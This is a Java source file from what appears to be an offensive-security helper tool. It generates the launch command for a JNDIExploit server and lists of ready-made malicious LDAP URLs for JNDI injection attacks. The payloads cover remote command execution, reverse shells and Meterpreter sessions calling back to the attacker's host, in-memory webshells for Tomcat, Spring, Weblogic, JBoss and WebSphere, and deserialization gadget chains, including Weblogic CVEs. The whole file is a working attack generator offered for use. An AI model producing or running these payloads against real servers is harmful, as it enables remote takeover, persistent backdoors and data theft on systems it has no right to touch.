package com.swordHostDemo.controller;

import com.swordHostDemo.pojo.menuBeanListener;
import com.swordHostDemo.utls.enCodeUtls;

import java.beans.VetoableChangeListener;

/**
 * @date: 2023/2/22 20:04
 * @description:
 */
public class JNDIExploitControler {


    public void JNDIExploitControler() {

        JNDIExploit();
        JavaBytecodeExec();
        Deserialization();
        tomcatBypass();
        otherFactoryBypass();

    }

    public static String JNDIExploit() {
        return "java -jar JNDIExploit-1.4-SNAPSHOT.jar -i " + menuBeanListener.getLhost() + " -p " + menuBeanListener.getHTTPPort() + " -l " + menuBeanListener.getLDAPPort();

    }

    public static String JavaBytecodeExec() {
        String str = "By LDAP (jdk8u<191)\n";

        String byteCode = "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/Dnslog/" + menuBeanListener.getDnsLog() + "\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/Command/" + menuBeanListener.getCommand() + "\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/Command/Base64/" + enCodeUtls.base64Encode(menuBeanListener.getCommand()) + "\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/ReverseShell/" + menuBeanListener.getLhost() + "/" + menuBeanListener.getLport() + "\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/TomcatEcho\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/SpringEcho\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/WeblogicEcho\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/TomcatMemshell1\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/TomcatMemshell2\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/TomcatMemshell3\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/GodzillaMemshell\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/JettyMemshell\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/WeblogicMemshell1\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/WeblogicMemshell2\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/JBossMemshell\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/WebsphereMemshell\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Basic/SpringMemshell";


        return str+byteCode;
    }

    public static String Deserialization() {
        String str = "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Deserialization/{GadgetType}/{PayloadType}/{Params}\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Deserialization/URLDNS/"+menuBeanListener.getDnsLog()+"\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Deserialization/CommonsCollectionsK1/Dnslog/"+menuBeanListener.getDnsLog()+"\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Deserialization/CommonsCollectionsK2/Command/Base64/"+enCodeUtls.base64Encode(menuBeanListener.getCommand())+"\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Deserialization/CommonsBeanutils1/ReverseShell/" + menuBeanListener.getLhost() + "/"+menuBeanListener.getLport()+"\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Deserialization/CommonsBeanutils2/TomcatEcho\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Deserialization/C3P0/SpringEcho\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Deserialization/Jdk7u21/WeblogicEcho\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Deserialization/Jre8u20/TomcatMemshell\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Deserialization/CVE_2020_2555/WeblogicMemshell1\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/Deserialization/CVE_2020_2883/WeblogicMemshell2";
        return str;
    }

    public static String tomcatBypass() {
        String ldapStr = "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/TomcatBypass/Dnslog/" + menuBeanListener.getDnsLog() + "\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/TomcatBypass/Command/" + menuBeanListener.getCommand() + "\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/TomcatBypass/Command/Base64/" + enCodeUtls.base64Encode(menuBeanListener.getCommand()) + "\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/TomcatBypass/ReverseShell/" + menuBeanListener.getLhost() + "/" + menuBeanListener.getLport() + "\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/TomcatBypass/TomcatEcho\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/TomcatBypass/SpringEcho\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/TomcatBypass/TomcatMemshell1\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/TomcatBypass/TomcatMemshell2\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/TomcatBypass/TomcatMemshell3\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/TomcatBypass/GodzillaMemshell\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/TomcatBypass/SpringMemshell\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/TomcatBypass/Meterpreter/" + menuBeanListener.getLhost() + "/" + menuBeanListener.getLport();

        return ldapStr;
    }

    public static String otherFactoryBypass() {

        String str = "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/GroovyBypass/Command/" + menuBeanListener.getCommand() + "\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/GroovyBypass/Command/Base64/"+enCodeUtls.base64Encode(menuBeanListener.getCommand())+"\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/WebsphereBypass/List/file={file or directory}\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/WebsphereBypass/Upload/Dnslog/"+menuBeanListener.getDnsLog()+"\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/WebsphereBypass/Upload/Command/" + menuBeanListener.getCommand() + "\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/WebsphereBypass/Upload/Command/Base64/"+enCodeUtls.base64Encode(menuBeanListener.getCommand())+"\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/WebsphereBypass/Upload/ReverseShell/" + menuBeanListener.getLhost() + "/" + menuBeanListener.getLport() + "\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/WebsphereBypass/Upload/WebsphereMemshell\n" +
                "ldap://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLDAPPort() + "/WebsphereBypass/RCE/path={uploaded_jar_path}";
        return str;
    }

    public static void main(String[] args) {
        menuBeanListener.setLhost("127.0.0.1");
        menuBeanListener.setLport("4322");
        menuBeanListener.setDnsLog("12dnslog.cn");
        menuBeanListener.setCommand("whoami1");
        menuBeanListener.setHTTPPort("8110");
        menuBeanListener.setLDAPPort("123");

//        System.out.println(JNDIExploit());
//        System.out.println(JavaBytecodeExec());
//        System.out.println(Deserialization());
//        System.out.println(tomcatBypass());

        System.out.println(otherFactoryBypass());

    }
}
